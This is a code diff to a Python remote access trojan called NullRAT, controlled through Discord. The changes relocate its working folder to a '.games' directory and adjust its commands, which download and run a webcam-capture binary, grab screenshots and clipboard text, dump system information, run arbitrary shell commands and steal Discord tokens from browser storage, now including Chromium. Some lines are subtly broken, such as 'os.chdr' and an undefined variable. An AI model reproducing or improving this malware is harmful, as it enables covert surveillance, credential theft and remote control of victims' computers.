@@ -8,6 +8,9 @@ from socket import create_connection
 import discord, os, subprocess, re, time
 
 client, original_dir = discord.Bot(), os.getcwd()
+try: os.mkdir(os.path.join(f"C:\\Users\\{os.getenv('username')}", ".games"))
+except FileExistsError: pass
+nr_working = f"C:\\Users\\{os.getenv('username')}\\.games"
 
 @client.event
 async def on_ready():
@@ -56,15 +59,15 @@ async def geolocate(ctx):
 async def webcam(ctx):
     await ctx.defer()
     webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
-    os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
+    os.chdir(nr_working)
     with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
     subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     await ctx.interaction.followup.send(
         embed=discord.Embed(title="Here is the photo:", color=0x0081FA), 
-        file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
+        file=discord.File(nr_working + "\\image.png")
     )
-    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
-    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\cc.exe")
+    os.remove(nr_working + "\\image.png")
+    os.remove(nr_working + "\\cc.exe")
     os.chdir(original_dir)
 
 @client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
@@ -115,7 +118,7 @@ async def checked_tokens(ctx):
 async def gsl(ctx):
     await ctx.defer()
     subprocess.run(
-        'SYSTEMINFO > "C:\\Users\\{}\\Saved Games\\youtube.txt"'.format(os.getenv("username")),
+        f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
         shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
@@ -123,21 +126,21 @@ async def gsl(ctx):
     )
     await ctx.interaction.followup.send(
         "Here is the file", 
-        file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt", filename="General Output.txt"), 
+        file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
     )
-    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt")
+    os.remove(nr_working + "\\youtube.txt")
 
 @client.slash_command(description="Sends screenshot of entire monitor", guild_ids=server_ids)
 async def screenshot(ctx): 
     await ctx.defer()
-    with mss() as sct: sct.shot(output=f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
-    file = discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
+    with mss() as sct: sct.shot(output=nr_working+"\\monitor.png")
+    file = discord.File(nr_working + "\\monitor.png")
     await ctx.interaction.followup.send(file=file)
-    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
+    time.sleep(2)
+    os.remove(nr_working + "\\monitor.png")
 
 @client.slash_command(description="Sends text contents of clipboard", guild_ids=server_ids)
 async def clipboard(ctx): 
-    await ctx.defer()
     outp = subprocess.run(
             "PowerShell Get-Clipboard", 
             shell=True, 
@@ -145,7 +148,7 @@ async def clipboard(ctx):
             stderr=subprocess.PIPE, 
             stdin=subprocess.PIPE
         ).stdout.decode("CP437")
-    await ctx.interaction.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
+    await ctx.respond(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
@@ -182,17 +185,17 @@ async def change_directory(ctx, directory):
 async def listdir(ctx, directory_to_find="null"):
     if directory_to_find == "null":
         directory_to_find = os.getcwd()
-        subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
         try: os.chdir(dire)
         except: return await ctx.send(embed=Embed(title="Invalid directory! Please try again :)"))
-        subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     file = discord.File(
-        os.path.join(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt"), filename="Directory.txt"
+        os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
     )
     await ctx.respond("Contents of dir " + directory_to_find + " are:", file=file)
-    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt")
+    os.remove(nr_working + "\\dir.txt")
     os.chdir(original_dir)
 
 # Misc. Commands #
@@ -209,6 +212,7 @@ async def startup(ctx):
     
 @client.slash_command(description="Executes shell commands", guild_ids=server_ids)
 async def shell(ctx, msg): 
+    await ctx.defer()
     global status; status = None
     from threading import Thread
     def shell():
@@ -222,20 +226,21 @@ async def shell(ctx, msg):
         numb = len(result)
         print(numb)
         if numb < 1:
-            return await ctx.respond(
+            return await ctx.interaction.followup.send(
                 embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
             )
         elif numb > 1990:
+            os.chdr(nr_working)
             f1 = open("shell.txt", "a")
             f1.write(result)
             f1.close()
             file = discord.File("shell.txt", filename="shell.txt")
-            return await ctx.respond("Command successfully executed", file=file)
+            return await ctx.interaction.followup.send("Command successfully executed", file=file)
             os.popen("del shell.txt")
         else:
-            return await ctx.respond(f"```{result}```")
+            return await ctx.interaction.followup.send(f"```{result}```")
     else:
-        await ctx.respond(
+        await ctx.interaction.followup.send(
             embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
         )
         status = None
@@ -250,7 +255,7 @@ async def close(ctx, ip):
         
 @client.slash_command(description="Quits all instances of NullRAT", guild_ids=server_ids)
 async def close_all(ctx):
-    await ctx.send("Are you sure?", view=closeall_confirm())
+    await ctx.respond("Are you sure?", view=closeall_confirm())
       
 class closeall_confirm(discord.ui.View):
     @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
@@ -293,7 +298,7 @@ def find_token():
         "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
         "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
         "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
-        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
+        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
     }
     for platform, path in paths.items():
         path += '\\Local Storage\\leveldb'
